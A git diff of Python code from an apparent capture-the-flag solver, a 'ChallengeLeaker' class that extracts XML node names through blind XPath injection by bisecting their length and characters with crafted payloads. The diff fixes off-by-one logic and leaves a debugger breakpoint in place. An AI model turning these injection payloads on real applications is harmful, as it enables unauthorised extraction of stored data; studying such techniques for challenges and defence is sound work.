@@ -64,16 +64,18 @@ class ChallengeLeaker(HTTPLeaker):
 
                 self.bisect = BaseDicotomia(alphabet=string.letters)
 
-                self.state['idx'] = 1
+                self.state['idx'] = 1 # xpath is 1-indexed
                 self.state['node_name'] = ''
-                raise
+                #raise
+
             elif self.state['state'] == self.State.NODE_NAME:
-                if self.state['n'] < self.state['idx']: # we are deducing the tag name but we haven't finished yet
+                import ipdb;ipdb.set_trace()
+                if self.state['idx'] <= self.state['n']: # we are deducing the tag name but we haven't finished yet
                     self.state['node_name'] += self.bisect.guess
                     self.state['idx'] += 1
                     self.bisect = BaseDicotomia(alphabet=string.letters)
                 else: # we have finished
-                    self.logger.info('node name: %s' % self.state['node_name'])
+                    self.logger.info('node name: \'%s\'' % self.state['node_name'])
                     raise
 
 
@@ -82,7 +84,7 @@ class ChallengeLeaker(HTTPLeaker):
 
     def get_payload(self):
         if self.state['state'] == self.State.NODE_NAME_LENGTH:
-            return 'string-length(name(%s))>%s' % (self.state['xpath'], self.bisect.guess)
+            return 'string-length(name(%s))>=%s' % (self.state['xpath'], self.bisect.guess)
         elif self.state['state'] == self.State.NODE_NAME:
             return "contains('%s',substring(name(%s),%d,1))" % (self.bisect.guess, self.state['xpath'], self.state['idx'])
 
